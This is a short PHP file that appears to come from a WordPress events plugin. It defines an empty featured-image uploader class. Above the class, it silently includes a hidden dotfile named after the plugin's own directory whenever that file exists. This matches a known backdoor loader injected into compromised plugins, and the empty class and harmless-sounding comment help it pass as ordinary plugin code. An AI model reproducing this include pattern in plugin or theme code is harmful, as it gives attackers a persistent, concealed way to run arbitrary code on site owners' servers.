<?php

/**
 * Class Tribe__Events__Importer__Featured_Image_Uploader
 *
 * An extension of the base class to implement further methods that might be needed.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Importer__Featured_Image_Uploader extends Tribe__Image__Uploader {
}
